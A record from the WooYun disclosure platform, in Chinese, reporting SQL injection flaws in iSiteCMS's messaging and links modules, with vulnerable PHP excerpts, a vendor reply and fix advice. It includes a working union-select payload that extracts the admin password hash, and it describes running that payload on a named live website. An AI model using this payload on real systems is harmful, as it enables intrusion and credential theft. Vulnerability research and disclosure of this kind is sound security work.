{"id": 5354, "wybug_id": "wooyun-2013-046702", "wybug_title": "iSiteCMS发布安全补丁后仍然有几处注射漏洞（源码详析+实站演示）", "wybug_corp": "kometo.com", "wybug_author": "lxj616", "wybug_date": "2013-12-23 16:45", "wybug_open_date": "2014-03-23 16:45", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-23：\t细节向公众公开  简要描述： iSiteCMS 之前有过一个后台登陆时的注射，不过后来修复了，但是还有几处注射分布在XX模块以及XXX模块里本文对源代码进行了详细的分析源码分析请见详细说明，实站演示请见漏洞证明 详细说明：  /isite/components/messages/messages.fe.php    line:103\nif($form->status == TFORM_STATUS_GETED_VALID){//这个是站内短信的写信息表单 的 处理      $arr = $form->getValues();//直接获取表单中信息      $tos = explode(',',trim($arr['to']));//只是分割，不是过滤      $noExistsMenber = array();      $toMenbers = array();      foreach ($tos as $menber){        $i =        $this->DBE->getOne(\"select `id` from #__user where `name`='$menber'\");//一直到上面这一句都没有过滤，直接带入数据库查询了，之所以会这么写可能的原因是开发人员误以为`name`='$menber'的引号可以起到保护作用（其他的int变量都通过了inval，而这个是string啊喵，我可以输入单引号啊喵）        if(is_null($i) or empty($i)){          $noExistsMenber[] = $menber;//id只要有返回就可以继续        }else{          $m['name'] = $menber;          $m['id']  = $i;          $toMenbers[] = $m;        }      }      if(!empty($noExistsMenber)){        addGlobalNotice(\"以下用户不存在：\".implode(',',$noExistsMenber));      }else{        $msg['tos'] = $arr['to'];        $msg['subject'] = $arr['subject'];        $msg['content'] = $arr['content'];//进入信息发送的模块了，实际上之前就已经引发注射了，但是攻击时需要读sendMessage代码        $mMessage->sendMessage($toMenbers,$msg);        $this->flash('成功','发送成功',bu(1,'messages','inbox'));      }\n这个就是代码里的表单显示\n\n先来个同理可证：/isite/components/links/links.be.php   line:64\nif($form->status == TFORM_STATUS_GETED_VALID){\t\t\t$newCat = $form->getValues();\t\t\tif($id==0){\t\t\t\t//create category\t\t\t\t//check name\t\t\t\t$name = $newCat['name'];\t\t\t\t$nameUsed = $this->DBE->getOne(\"select count(*) from #__link_category where `name`='$name'\");\t\t\t\tif($nameUsed){\t\t\t\t\t$form->status = TFORM_STATUS_GETED;\n看完以上代码是不是有一种似曾相识的感觉呢？漏洞成因分析完毕下面是对于攻击方式的分析，如果您只关心如何把漏洞补上，也可以直接跳过以下内容到漏洞修复那里注射肯定是有了，但是这里有一点点别扭的地方，就是\n$tos = explode(',',trim($arr['to']));\n这句话把逗号给干掉了，给注射添加了小小难度，不过，这能难倒WOOYUN的帽子们吗？继续分析代码：/isite/components/messages/models/message.php   整个php\nfunction sendMessage($to,$message,$type=null,$newCall=1){//刚才检测完用户是否存在后，调用这个函数    if(isset($to['name']) or is_string($to)){      if(is_string($to)){        $to['name'] = $to;      }      if(!isset($to['id'])){//还记得id吗，是之前被注射SQL的返回，理论上正常应该是目标用户的id        $to['id'] = $this->_db->getOne(\"select `id` from #__user where `name`='$to[name]'\");      }//又SELECT一遍，不过name还是注射时的name，这一句也被注射了      global $gUser;      $message['to'] = $to['name'];      $message['to_id'] = $to['id'];      $message['from'] = $gUser->name;      $message['from_id'] = $gUser->id;      $message['create_time'] = TIME_STAMP;      $message['type'] = $type;      $this->insert($message);//看到下一句，终于长舒一口气，注射可以有回显了！to_id就是我们的语句执行结果，而它会报错给我们看的！      $this->_db->execute(\"update #__user set `new_msg_count`=`new_msg_count`+1 where `id`=$message[to_id]\");      if($newCall>0){        $message['to'] = '';        $message['to_id'] = 0;        $this->insert($message);        $newCall--;      }    }else if(is_array($to)){      foreach ($to as $sto){        $this->sendMessage($sto,$message,null,$newCall);      }    }  }\n注射+回显方法 ： \ntest' and 1=2 union select password from flexi_user where id=1#\nunion select 后面加你想看的内容即可，不过记着不能用逗号哦   漏洞证明：  演示站点为http://www.xfdt.com\n\n注册一下，在会员中心-站内短信-发信息 里那个link模块里的注射没找到表单在什么地方，先演示这个吧这个就是代码里的表单显示\n\n先执行个database()函数\n\n爆管理员密码sha1\ntest' and 1=2 union select password from flexi_user where id=1#\n\n\n   修复方案：  修补方式分析：目前的状态是：数字型+语句中单引号（可防注射）；字符型+语句中单引号（仍能注射）主要需要考虑字符型变量的过滤问题可以addslashes，也可以用普通过滤也可以用框架提供的安全特性   版权声明：转载请注明来源 lxj616@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-12-24 22:07 厂商回复： messages模块应该是该实例网站自己扩展的模块，但经过我们检查，在部分集成模块的输入过滤上确实存在漏洞，严重影响了系统安全，同时考虑到该系统主要设计为封闭管理，会员功能不对外开放，所以综合评价危害等级为中。我们将于近期进行安全更新。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}